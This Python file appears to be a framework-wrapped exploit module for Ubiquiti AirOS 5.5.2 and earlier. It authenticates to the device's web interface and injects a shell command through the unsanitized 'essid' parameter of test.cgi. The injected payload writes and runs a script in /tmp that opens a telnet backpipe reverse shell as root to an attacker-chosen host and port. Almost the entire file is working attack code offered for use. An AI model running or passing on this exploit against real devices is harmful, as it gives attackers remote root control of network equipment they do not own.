def about():
	print '''
Exploit Title : Ubiquiti AirOS <= 5.5.2 Remote POST-Auth Root Command Execution
Date  : 12-28-2012
Author: xistence (xistence<[AT]>0x90.nl)
Software link : http://www.ubnt.com/eula/?BACK=/downloads/XM-v5.5.2.build14175.bin
Vendor site   : http://www.ubnt.com/
Version   : 5.5.2 and lower
Tested on : PicoStation M2 (hardware)
	'''

def auto_help(name,rank,description):
	stbl = "  " + name + " "*(13-len(name)+4) + rank + " "*(8-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "Vulnrable Applications (AirOSRCE)"
	print
	print "  ID	   Device"
	print "  --	   ------"
	for _ in targetlist:
		print "  "+_+" "*(9-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("AirOSRCE","Normal","Remote Code Execution on AirOS")
except:
	pass

def auto_info(name,module,plat,priv,lic,rank,release="N/A",by="N/A"):
	print
	print "Publisher Information for AirOSRCE"
	print
	print "	   Name:","AirOSRCE"
	print "	 Module:",module
	print "   Platform:","Python"
	print " Privileged:","No"
	print "	License:","None"
	print "	   Rank:",rank
	print "  Disclosed:",release

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(15-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

class AirOSRCE(object):
	def start(self):
		#!/usr/bin/python
		#+--------------------------------------------------------------------------------------------------------------------------------+
		# Exploit Title	 : Ubiquiti AirOS <= 5.5.2 Remote POST-Auth Root Command Execution
		# Date			  : 12-28-2012
		# Author			: xistence (xistence<[AT]>0x90.nl)
		# Software link	 : http://www.ubnt.com/eula/?BACK=/downloads/XM-v5.5.2.build14175.bin
		# Vendor site	   : http://www.ubnt.com/
		# Version		   : 5.5.2 and lower
		# Tested on		 : PicoStation M2 (hardware)
		#
		# Vulnerability	 : The http://<IP>/test.cgi "essid" parameter is not sanitized for input which allows for execution of operating
		#					 system commands. The parameter input field can be like this to create a file /tmp/test.txt:
		#					 "LINKTEST & /bin/touch /tmp/test.txt #"
		#			  Authentication to the web site is necessary to exploit this vulnerability. 
		#+--------------------------------------------------------------------------------------------------------------------------------+
		
		
		import urllib, urllib2, cookielib, sys, random, mimetools, mimetypes, itertools, time, socket
		socket.setdefaulttimeout(3)
		
		
		print ""
		print "[*] Ubiquiti AirOS <= 5.5.2 Remote POST-Auth Root Command Execution - xistence (xistence<[at]>0x90.nl) - 2012-12-28"
		print ""
		
		rhost = raw_input("Remote Host: ")
		lhost = raw_input("Local Host: ")
		lport = raw_input("Local Port: ")
		webUser = raw_input("WebUser: ")
		webPass = raw_input("WebPass: ")
		
		# Create a random file with 8 characters
		filename = ''
		for i in random.sample('abcdefghijklmnopqrstuvwxyz1234567890',8):
			filename+=i
		filename +=".sh"
		
		shellCmd = '& echo "mknod /tmp/backpipe p ; telnet ' + lhost + ' ' + lport + ' 0</tmp/backpipe | /bin/sh -C 1>/tmp/backpipe 2>/tmp/backpipe ; rm -rf /tmp/backpipe ; rm -rf /tmp/' + filename + '" > /tmp/' + filename + ' ; chmod +x /tmp/' + filename + ' ; /bin/sh /tmp/' + filename + ' #'
		
		class MultiPartForm(object):
			"""Accumulate the data to be used when posting a form."""
		
			def __init__(self):
				self.form_fields = []
				self.files = []
				self.boundary = mimetools.choose_boundary()
				return
		
			def get_content_type(self):
				return 'multipart/form-data; boundary=%s' % self.boundary
		
			def add_field(self, name, value):
				"""Add a simple field to the form data."""
				self.form_fields.append( ( name, value ) )
				return
		   
			def __str__(self):
				"""Return a string representing the form data, including attached files."""
				# Build a list of lists, each containing "lines" of the
				# request.  Each part is separated by a boundary string.
				# Once the list is built, return a string where each
				# line is separated by '\r\n'.
				parts = []
				part_boundary = '--' + self.boundary
		
				# Add the form fields
				parts.extend(
					[ part_boundary,
					  'Content-Disposition: form-data; name="%s"' % name,
					  '',
					  value,
					]
					for name, value in self.form_fields
					)
		
				# Flatten the list and add closing boundary marker,
				# then return CR+LF separated data
				flattened = list( itertools.chain( *parts) )
				flattened.append( '--' + self.boundary + '--' )
				flattened.append( '' )
				return '\r\n'.join( flattened )
		
		
		
		# Create the form with simple fields
		form = MultiPartForm()
		form.add_field( 'uri', '' )
		form.add_field( 'username', webUser )
		form.add_field( 'password', webPass )
		
		form2 = MultiPartForm()
		form2.add_field( 'essid', 'LINKTEST ' + shellCmd )
		form2.add_field( 'channel', '2412' )
		form2.add_field( 'rssithresh', '13' )
		form2.add_field( 'file_url', '' )
		form2.add_field( 'action', 'test' )
		 
		# Our Cookie Jar
		cj = cookielib.CookieJar()
		opener = urllib2.build_opener( urllib2.HTTPCookieProcessor( cj ) )
		
		# Just open the default url to grab the cookies and put them in the jar
		print "[+] Opening default page [http://%s] to store cookies" % rhost
		resp = opener.open( "http://%s" %rhost )
		
		# Create our multi-part body + headers login POST request
		print "[+] Logging in with user [%s] and password [%s] at host [%s]" % ( webUser, webPass, rhost )
		resp = urllib2.Request( "http://%s/login.cgi" % rhost )
		body = str( form )
		resp.add_header( 'Content-type', form.get_content_type() )
		resp.add_header( 'Content-length', len( body ) )
		resp.add_data( body )
		request = opener.open( resp ).read()
		
		# Create our multi-part body + headers command execution POST request
		print "[+] Executing reverse shell commands [file = /tmp/" + filename + "], this might take up to a minute before a response is received in your netcat shell"
		resp = urllib2.Request( "http://%s/test.cgi" % rhost )
		body = str( form2 )
		resp.add_header( 'Content-type', form2.get_content_type() )
		resp.add_header( 'Content-length', len( body ) )
		resp.add_data( body )
		request = opener.open( resp ).read()
		
		time.sleep(3)
		print "[+] Done, check your netcat reverse shell on ip [%s] port [%s]" % ( lhost, lport )
		print ""

def show_opt():
	print
	print "Module Options (AirOSRCE)"
	print
	print "  Name	 Current Setting  Required  Description"
	print "  ----	 ---------------  --------  -----------"
	print "Raw Input Arguments"
	print 

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "proc":
		try:
			program = AirOSRCE()
			program.start()
		except Exception as e:
			print e
			print "[-] Failed"
			show_opt()
except:
	pass
